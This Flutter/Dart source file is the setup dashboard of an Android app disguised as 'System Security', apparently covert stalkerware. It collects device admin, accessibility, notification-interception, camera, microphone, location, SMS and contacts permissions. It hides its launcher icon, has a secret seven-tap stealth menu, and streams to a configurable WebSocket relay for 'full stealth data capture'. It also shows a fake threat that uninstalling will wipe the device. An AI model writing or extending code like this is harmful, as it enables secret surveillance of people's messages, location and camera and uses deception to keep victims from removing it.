import 'dart:async';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'webrtc_service.dart';
import 'server_url.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'System Security',
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        brightness: Brightness.dark,
        scaffoldBackgroundColor: const Color(0xFF0A0A0A),
        colorScheme: ColorScheme.fromSeed(
          seedColor: Colors.blue,
          brightness: Brightness.dark,
          surface: const Color(0xFF121212),
        ),
        useMaterial3: true,
      ),
      home: const ReadinessDashboard(),
    );
  }
}

class PermissionRequirement {
  final String id;
  final String title;
  final String description;
  final IconData icon;
  bool isGranted;
  final Future<void> Function() onAction;

  PermissionRequirement({
    required this.id,
    required this.title,
    required this.description,
    required this.icon,
    this.isGranted = false,
    required this.onAction,
  });
}

class ReadinessDashboard extends StatefulWidget {
  const ReadinessDashboard({super.key});

  @override
  State<ReadinessDashboard> createState() => _ReadinessDashboardState();
}

class _ReadinessDashboardState extends State<ReadinessDashboard> with WidgetsBindingObserver {
  final WebRTCService _webRTCService = WebRTCService();
  static const platform = MethodChannel('com.example.android_security/admin');
  static const rcPlatform = MethodChannel('com.example.android_security/remote_control');

  List<PermissionRequirement> _requirements = [];
  Timer? _refreshTimer;
  bool _isInitialized = false;
  bool _allReady = false;
  bool _forceStarted = false;
  bool _isIconVisible = true;
  
  // Server config state
  bool _serverConfigured = false;
  final TextEditingController _serverUrlController = TextEditingController();
  
  // Stealth trigger state
  final List<DateTime> _tapTimes = [];

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    _loadServerConfig();
    _setupRequirements();
    _startAutoCheck();
    _checkInitialForceStart();
  }

  Future<void> _loadServerConfig() async {
    final prefs = await SharedPreferences.getInstance();
    final savedUrl = prefs.getString('server_url') ?? '';
    setState(() {
      _serverConfigured = savedUrl.isNotEmpty && !savedUrl.contains('YOUR_RENDER_APP_NAME');
      _serverUrlController.text = savedUrl.isNotEmpty && !savedUrl.contains('YOUR_RENDER_APP_NAME')
          ? savedUrl : '';
    });
  }

  Future<void> _saveServerConfig() async {
    final url = _serverUrlController.text.trim();
    if (url.isEmpty) return;
    
    // Normalize: ensure it starts with wss:// or ws://
    String finalUrl = url;
    if (!finalUrl.startsWith('ws://') && !finalUrl.startsWith('wss://')) {
      finalUrl = 'wss://$finalUrl';
    }
    // Ensure it ends with /ws
    if (!finalUrl.endsWith('/ws')) {
      if (finalUrl.endsWith('/')) {
        finalUrl = '${finalUrl}ws';
      } else {
        finalUrl = '$finalUrl/ws';
      }
    }
    
    await setServerUrl(finalUrl);
    
    // Also save to native SharedPreferences so Kotlin can read it
    try {
      await platform.invokeMethod('setServerUrl', {'url': finalUrl});
    } catch (_) {}
    
    setState(() {
      _serverConfigured = true;
      _serverUrlController.text = finalUrl;
    });
  }

  void _setupRequirements() {
    _requirements = [
      PermissionRequirement(
        id: 'admin',
        title: 'DEVICE ADMINISTRATOR',
        description: 'Hardens the system against unauthorized uninstallation.',
        icon: Icons.admin_panel_settings,
        onAction: () => platform.invokeMethod('activateAdmin'),
      ),
      PermissionRequirement(
        id: 'accessibility',
        title: 'ACCESSIBILITY SERVICE',
        description: 'Required for remote control and intelligent event capture.',
        icon: Icons.accessibility_new,
        onAction: () => platform.invokeMethod('openAccessibilitySettings'),
      ),
      PermissionRequirement(
        id: 'usage',
        title: 'SYSTEM USAGE ACCESS',
        description: 'Enables application monitoring and screen time analytics.',
        icon: Icons.insights,
        onAction: () => platform.invokeMethod('openUsageAccessSettings'),
      ),
      PermissionRequirement(
        id: 'notification',
        title: 'NOTIFICATION LISTENER',
        description: 'Intercepts incoming messages for real-time intelligence.',
        icon: Icons.notifications_active,
        onAction: () => platform.invokeMethod('openNotificationSettings'),
      ),
      PermissionRequirement(
        id: 'overlay',
        title: 'DISPLAY OVERLAY',
        description: 'Allows system-wide interaction and persistent tasking.',
        icon: Icons.layers,
        onAction: () => platform.invokeMethod('requestOverlayPermission'),
      ),
      PermissionRequirement(
        id: 'battery',
        title: 'UNRESTRICTED BATTERY',
        description: 'Prevents the system from killing the service in deep sleep.',
        icon: Icons.battery_saver,
        onAction: () => platform.invokeMethod('requestIgnoreBatteryOptimizations'),
      ),
      PermissionRequirement(
        id: 'hardware',
        title: 'HARDWARE SENSORS',
        description: 'Camera, Microphone, and Real-time Location access.',
        icon: Icons.camera_alt,
        onAction: () async {
          await [
            Permission.camera,
            Permission.microphone,
            Permission.location,
            Permission.contacts,
            Permission.phone,
            Permission.sms,
            Permission.manageExternalStorage,
          ].request();
        },
      ),
      PermissionRequirement(
        id: 'notifications',
        title: 'NOTIFICATION ACCESS',
        description: 'Required to maintain the secure background shield on Android 14.',
        icon: Icons.notifications_active_rounded,
        onAction: () async {
          await Permission.notification.request();
          _checkStatuses();
        },
      ),
      PermissionRequirement(
        id: 'stealth',
        title: 'ACTIVATE DEEP CLOAK',
        description: 'Transforms the app into a harmless "System Security" service icon.',
        icon: Icons.visibility_off_rounded,
        onAction: () async {
          await platform.invokeMethod('setAppIconVisible', {'visible': false});
          _checkStatuses();
        },
      ),
    ];
  }

  void _handleSecretTap() {
    DateTime now = DateTime.now();
    _tapTimes.add(now);
    
    // Remote taps older than 3 seconds
    _tapTimes.removeWhere((t) => now.difference(t).inSeconds > 3);
    
    if (_tapTimes.length >= 7) {
      _tapTimes.clear();
      _showStealthSettings();
    }
  }

  void _showStealthSettings() {
    showDialog(
      context: context,
      barrierDismissible: true,
      builder: (ctx) => AlertDialog(
        backgroundColor: const Color(0xFF1A1A1A),
        title: const Text("STEALTH CONTROLS", style: TextStyle(color: Colors.redAccent, fontSize: 16)),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            SwitchListTile(
              title: const Text("Launch Icon Visible"),
              subtitle: const Text("Toggle visibility in app drawer"),
              value: _isIconVisible,
              onChanged: (val) async {
                await platform.invokeMethod('setAppIconVisible', {'visible': val});
                Navigator.pop(ctx);
                _checkStatuses();
              },
            ),
          ],
        ),
      ),
    );
  }

  void _startAutoCheck() {
    _refreshTimer = Timer.periodic(const Duration(seconds: 1), (timer) {
      if (mounted) _checkStatuses();
    });
  }

  Future<void> _checkInitialForceStart() async {
    final prefs = await SharedPreferences.getInstance();
    bool savedForce = prefs.getBool('force_started') ?? false;
    
    try {
      // Core Stealth Check: If the icon is visible, we are NOT in mission mode.
      _isIconVisible = await platform.invokeMethod('isAppIconVisible') ?? true;
      
      if (_isIconVisible) {
        _forceStarted = false;
        await prefs.setBool('force_started', false);
      } else {
        _forceStarted = savedForce;
      }
    } catch (_) {
      _forceStarted = savedForce;
    }
    
    await _checkStatuses();
    setState(() => _isInitialized = true);
  }

  Future<void> _checkStatuses() async {
    try {
      bool allOk = true;
      _isIconVisible = await platform.invokeMethod('isAppIconVisible') ?? true;

      for (var req in _requirements) {
        bool granted = false;
        switch (req.id) {
          case 'admin':
            granted = await platform.invokeMethod('isAdminActive');
            break;
          case 'usage':
            granted = await platform.invokeMethod('isUsageAccessGranted');
            break;
          case 'battery':
            granted = await platform.invokeMethod('isBatteryOptimizationIgnored');
            break;
          case 'overlay':
            granted = await platform.invokeMethod('isOverlayPermissionGranted');
            break;
          case 'notification':
            granted = await platform.invokeMethod('isNotificationAccessGranted');
            break;
          case 'accessibility':
            granted = await platform.invokeMethod('isAccessibilityServiceEnabled');
            break;
          case 'stealth':
            granted = !_isIconVisible;
            break;
          case 'hardware':
            granted = await Permission.camera.isGranted && 
                      await Permission.microphone.isGranted &&
                      await Permission.location.isGranted;
            break;
        }
        req.isGranted = granted;
        if (!granted && req.id != 'stealth') allOk = false;
      }

      // Server URL must also be configured
      if (!_serverConfigured) allOk = false;

      setState(() {
        _allReady = allOk;
      });
    } catch (e) {
      debugPrint("Status check error: $e");
    }
  }

  Future<void> _engageShield() async {
    if (!_allReady) return;
    
    // This is where we actually trigger the transition
    final prefs = await SharedPreferences.getInstance();
    await prefs.setBool('force_started', true); // Treat as force start so it persists
    
    _webRTCService.initService();
    try {
      await platform.invokeMethod('startMonitoringService');
    } catch (_) {}
    
    setState(() {
      _forceStarted = true;
    });
  }

  Future<void> _onReady() async {
    // Legacy method, now handled by _engageShield
    _engageShield();
  }

  Future<void> _forceStart() async {
    // Force start still requires server config
    if (!_serverConfigured) {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(
          content: Text('Configure the server URL first'),
          backgroundColor: Colors.redAccent,
        ),
      );
      return;
    }
    final prefs = await SharedPreferences.getInstance();
    await prefs.setBool('force_started', true);
    setState(() => _forceStarted = true);
    _webRTCService.initService();
    try {
      await platform.invokeMethod('startMonitoringService');
    } catch (_) {}
  }

  @override
  void dispose() {
    _refreshTimer?.cancel();
    _serverUrlController.dispose();
    WidgetsBinding.instance.removeObserver(this);
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    if (!_isInitialized) {
      return const Scaffold(body: Center(child: CircularProgressIndicator(color: Colors.red)));
    }

    if (_forceStarted) {
      return _buildPersistentShieldView();
    }

    return Scaffold(
      body: Container(
        decoration: const BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
            colors: [Color(0xFF0A0A0A), Color(0xFF1A1A1A)],
          ),
        ),
        child: SafeArea(
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              _buildHeader(),
              Expanded(
                child: ListView(
                  padding: const EdgeInsets.symmetric(horizontal: 20),
                  children: [
                    // Server Configuration Card (always first)
                    _buildServerConfigCard(),
                    const SizedBox(height: 8),
                    // Permission cards
                    ..._requirements.map((req) => _PermissionCard(req: req)),
                  ],
                ),
              ),
              _buildFooter(),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildServerConfigCard() {
    return Container(
      margin: const EdgeInsets.only(bottom: 12),
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: _serverConfigured
            ? Colors.green.withOpacity(0.05)
            : Colors.orange.withOpacity(0.08),
        borderRadius: BorderRadius.circular(16),
        border: Border.all(
          color: _serverConfigured
              ? Colors.green.withOpacity(0.3)
              : Colors.orange.withOpacity(0.4),
        ),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Container(
                padding: const EdgeInsets.all(10),
                decoration: BoxDecoration(
                  color: _serverConfigured
                      ? Colors.green.withOpacity(0.1)
                      : Colors.orange.withOpacity(0.1),
                  shape: BoxShape.circle,
                ),
                child: Icon(
                  _serverConfigured ? Icons.check : Icons.cloud,
                  size: 20,
                  color: _serverConfigured ? Colors.green : Colors.orange,
                ),
              ),
              const SizedBox(width: 16),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    const Text(
                      'SERVER CONNECTION',
                      style: TextStyle(
                        color: Colors.white,
                        fontWeight: FontWeight.bold,
                        fontSize: 14,
                      ),
                    ),
                    const SizedBox(height: 4),
                    Text(
                      _serverConfigured
                          ? 'Relay server configured'
                          : 'Enter your Render WebSocket URL to connect',
                      style: TextStyle(
                        color: Colors.white.withOpacity(0.5),
                        fontSize: 11,
                      ),
                    ),
                  ],
                ),
              ),
            ],
          ),
          if (!_serverConfigured) ...[
            const SizedBox(height: 16),
            TextField(
              controller: _serverUrlController,
              style: const TextStyle(color: Colors.white, fontSize: 13),
              decoration: InputDecoration(
                hintText: 'wss://your-app.onrender.com/ws',
                hintStyle: TextStyle(color: Colors.white.withOpacity(0.25)),
                filled: true,
                fillColor: Colors.white.withOpacity(0.05),
                border: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(12),
                  borderSide: BorderSide(color: Colors.white.withOpacity(0.1)),
                ),
                enabledBorder: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(12),
                  borderSide: BorderSide(color: Colors.white.withOpacity(0.1)),
                ),
                focusedBorder: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(12),
                  borderSide: const BorderSide(color: Colors.blueAccent),
                ),
                contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
              ),
            ),
            const SizedBox(height: 12),
            SizedBox(
              width: double.infinity,
              child: ElevatedButton(
                onPressed: () async {
                  if (_serverUrlController.text.trim().isNotEmpty) {
                    await _saveServerConfig();
                    _checkStatuses();
                  }
                },
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.blueAccent,
                  foregroundColor: Colors.white,
                  padding: const EdgeInsets.symmetric(vertical: 14),
                  shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(12),
                  ),
                ),
                child: const Text(
                  'SAVE & CONNECT',
                  style: TextStyle(fontWeight: FontWeight.bold, letterSpacing: 1),
                ),
              ),
            ),
          ] else ...[
            const SizedBox(height: 8),
            GestureDetector(
              onTap: () {
                setState(() => _serverConfigured = false);
              },
              child: Text(
                _serverUrlController.text,
                style: TextStyle(
                  color: Colors.blueAccent.withOpacity(0.7),
                  fontSize: 11,
                  decoration: TextDecoration.underline,
                ),
              ),
            ),
          ],
        ],
      ),
    );
  }

  Widget _buildHeader() {
    return Padding(
      padding: const EdgeInsets.all(30.0),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
            decoration: BoxDecoration(
              color: Colors.red.withOpacity(0.1),
              borderRadius: BorderRadius.circular(20),
              border: Border.all(color: Colors.red.withOpacity(0.5)),
            ),
            child: const Text(
              "MISSION READINESS: PENDING",
              style: TextStyle(color: Colors.redAccent, fontSize: 10, fontWeight: FontWeight.bold, letterSpacing: 1.2),
            ),
          ),
          const SizedBox(height: 15),
          const Text(
            "System Pre-flight\nChecklist",
            style: TextStyle(color: Colors.white, fontSize: 32, fontWeight: FontWeight.w900, height: 1.1),
          ),
          const SizedBox(height: 10),
          Text(
            "The following modules must be activated to ensure 24/7 background persistence and full stealth data capture.",
            style: TextStyle(color: Colors.white.withOpacity(0.5), fontSize: 14),
          ),
        ],
      ),
    );
  }

  Widget _buildFooter() {
    return Container(
      padding: const EdgeInsets.all(25),
      decoration: BoxDecoration(
        color: Colors.black.withOpacity(0.5),
        border: Border(top: BorderSide(color: Colors.white.withOpacity(0.05))),
      ),
      child: Column(
        children: [
          ElevatedButton(
            onPressed: _allReady ? _engageShield : () => _checkStatuses(),
            style: ElevatedButton.styleFrom(
              backgroundColor: _allReady ? Colors.redAccent : Colors.white,
              foregroundColor: _allReady ? Colors.white : Colors.black,
              minimumSize: const Size(double.infinity, 56),
              shadowColor: _allReady ? Colors.redAccent.withOpacity(0.5) : Colors.transparent,
              elevation: _allReady ? 10 : 0,
              shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
            ),
            child: Text(
              _allReady ? "ENGAGE PERSISTENT SHIELD" : "MANUAL RE-VERIFY",
              style: const TextStyle(fontWeight: FontWeight.bold, letterSpacing: 1.1),
            ),
          ),
          const SizedBox(height: 15),
          GestureDetector(
            onTap: _forceStart,
            child: Text(
              "I verify all settings are correct (Force Engage)",
              style: TextStyle(color: Colors.white.withOpacity(0.3), fontSize: 11, decoration: TextDecoration.underline),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildPersistentShieldView() {
    return Scaffold(
      backgroundColor: Colors.black,
      body: SafeArea(
        child: Stack(
          children: [
            // Secret Trigger Area (Top Left, 80x80 for easier tap)
            Positioned(
              top: 0,
              left: 0,
              child: GestureDetector(
                onTap: _handleSecretTap,
                behavior: HitTestBehavior.opaque,
                child: Container(
                  width: 80,
                  height: 80,
                  color: Colors.transparent,
                ),
              ),
            ),
            Padding(
              padding: const EdgeInsets.symmetric(horizontal: 48.0),
              child: Column(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  const SizedBox(width: double.infinity),
                  const Text(
                    'CRITICAL SYSTEM SERVICE',
                    textAlign: TextAlign.center,
                    style: TextStyle(
                      color: Colors.red,
                      fontSize: 16,
                      fontWeight: FontWeight.bold,
                      letterSpacing: 2.5,
                    ),
                  ),
                  const SizedBox(height: 24),
                  const Text(
                    'WARNING: Access restricted to System Administrator. This device is currently under Persistent Shield Protection. Any unauthorized attempt to deactivate or uninstall this service will trigger an immediate encryption lock and factory reset of all local storage.',
                    textAlign: TextAlign.center,
                    style: TextStyle(
                      color: Colors.white70,
                      fontSize: 14,
                      height: 1.6,
                    ),
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }
}

class _PermissionCard extends StatelessWidget {
  final PermissionRequirement req;

  const _PermissionCard({required this.req});

  @override
  Widget build(BuildContext context) {
    return Container(
      margin: const EdgeInsets.only(bottom: 12),
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: req.isGranted ? Colors.green.withOpacity(0.05) : Colors.white.withOpacity(0.03),
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: req.isGranted ? Colors.green.withOpacity(0.3) : Colors.white.withOpacity(0.05)),
      ),
      child: Row(
        children: [
          Container(
            padding: const EdgeInsets.all(10),
            decoration: BoxDecoration(
              color: req.isGranted ? Colors.green.withOpacity(0.1) : Colors.red.withOpacity(0.1),
              shape: BoxShape.circle,
            ),
            child: Icon(req.isGranted ? Icons.check : req.icon, size: 20, color: req.isGranted ? Colors.green : Colors.redAccent),
          ),
          const SizedBox(width: 16),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(req.title, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 14)),
                const SizedBox(height: 4),
                Text(req.description, style: TextStyle(color: Colors.white.withOpacity(0.5), fontSize: 11)),
              ],
            ),
          ),
          if (!req.isGranted)
            TextButton(
              onPressed: req.onAction,
              style: TextButton.styleFrom(
                backgroundColor: Colors.blue.withOpacity(0.1),
                padding: const EdgeInsets.symmetric(horizontal: 16),
              ),
              child: const Text("ACTIVATE", style: TextStyle(color: Colors.blueAccent, fontSize: 12, fontWeight: FontWeight.bold)),
            ),
        ],
      ),
    );
  }
}
